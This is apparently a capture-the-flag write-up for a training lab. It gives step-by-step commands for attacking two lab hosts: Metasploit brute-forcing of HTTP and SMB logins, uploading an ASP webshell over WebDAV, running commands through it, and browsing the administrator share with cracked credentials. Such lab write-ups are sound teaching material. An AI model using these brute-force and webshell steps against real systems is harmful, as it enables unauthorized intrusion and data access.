---
layout: post
title: "System-Host Based Attacks CTF 1 Write-up"
date: 2026-08-07
link: https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student
link_text: "INE eJPT Course"
categories: ctf-writeups
---
# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.

**Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

**Useful files:**

```
/usr/share/metasploit-framework/data/wordlists/common_users.txt, 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt,
/usr/share/webshells/asp/webshell.asp
```

**Flags to Capture:**

- **Flag 1**: User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)
- **Flag 2**: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)
- **Flag 3**: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)
- **Flag 4**: The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)

# Tools

The best tools for this lab are:

- Nmap
- Hydra
- Cadaver
- Metasploit Framework

---
# Task 1: 

**Clue:** User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)

The first step is to run an Nmap scan.

`nmap -sS -A -p- -T4 target.ine.local`
- `-sS`: runs a TCP SYN scan
- `-A`: enables OS detection, version detection, script scanning, and traceroute
- `-p-`: sets the port range from 1-65535
- `-T4`: sets the aggressiveness of the scan to a 4 out of 5

![](/assets/writeup_assets/system_host_based_attacks_ctf_1_writeup/nmap.png)
*Figure 1: Nmap scan*

There is a web server, but it requires authentication. Use the Metasploit module `scanner/http/http_login` to brute force the password.

First, create a file called `bob.txt` in the root directory with "bob" inside:

`echo bob > bob.txt`

Then, start MSF console:

`service postgresql start && msfconsole`

After the MSF terminal opens, use the following commands to complete the brute force:

```
use scanner/http/http_login
set RHOSTS target1.ine.local
set USER_FILE bob.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

![](/assets/writeup_assets/system_host_based_attacks_ctf_1_writeup/flag1_brute_force.png)
*Figure 2: scanner/http/http_login settings*

![](/assets/writeup_assets/system_host_based_attacks_ctf_1_writeup/bob_creds.png)
*Figure 3: Bob's credentials*

Bob's credentials are `bob:password_123321`. Use **cadaver** to connect to the target machine.

`cadaver http://target1.ine.local`

![](/assets/writeup_assets/system_host_based_attacks_ctf_1_writeup/flag1.png)
*Figure 4: Using cadaver to get Flag 1*

The flag is located in the `/webdav`.

---
# Task 2

**Clue:** Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)

Put the webshell on the server with `put /usr/share/webshells/asp/webshell.asp`.

![](/assets/writeup_assets/system_host_based_attacks_ctf_1_writeup/put_webshell.png)
*Figure 5: Putting the webshell on the server*

Then, go to `target1.ine.local` in the browser. Run `dir C:\ /s /b *flag*` to search the C drive for the flag.

![](/assets/writeup_assets/system_host_based_attacks_ctf_1_writeup/flag2.png)
*Figure 6: Flag 2*

Use `type C:\flag2.txt` to get the flag.

---
# Task 3

**Clue:** By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)

Use the `scanner/smb/smb_login` module to brute force the credentials. Set the following options:

```
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS target2.ine.local
run
```

![](/assets/writeup_assets/system_host_based_attacks_ctf_1_writeup/flag3_brute_force.png)
*Figure 7: Brute force settings*

The first set of credentials found are `rooty:spongebob`. Also found are `demo:password1`, `auditor:hellokitty`, and `administrator:pineapple`. Use `scanner/smb/smb_enumshares` to enumerate the shares.

```
use scanner/smb/smb_enumshares
set RHOSTS target2.ine.local
set SMBPass spongebob
set SMBUser rooty
run
```

![](/assets/writeup_assets/system_host_based_attacks_ctf_1_writeup/smb_enum.png)
*Figure 8: SMB enumeration*

The shares are **ADMIN, C, IPC, Shared, Shared2,** and **Shared3**.

Use the admin credentials to connect to the C share:

`smbclient //target2.ine.local/C$ -U "administrator%pineapple"`

![](/assets/writeup_assets/system_host_based_attacks_ctf_1_writeup/flag3.png)
*Figure 9: Flag 3*

Flag 3 is in the `C:\` directory. Use `get flag3.txt -` to get the flag.

---
# Task 4

**Clue:** The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)

Navigate to `\Users\Administrator\Desktop`.

![](/assets/writeup_assets/system_host_based_attacks_ctf_1_writeup/flag4.png)
*Figure 10: Flag 4*

Flag 4 is located in this directory. Get it by using `get flag4.txt -`.
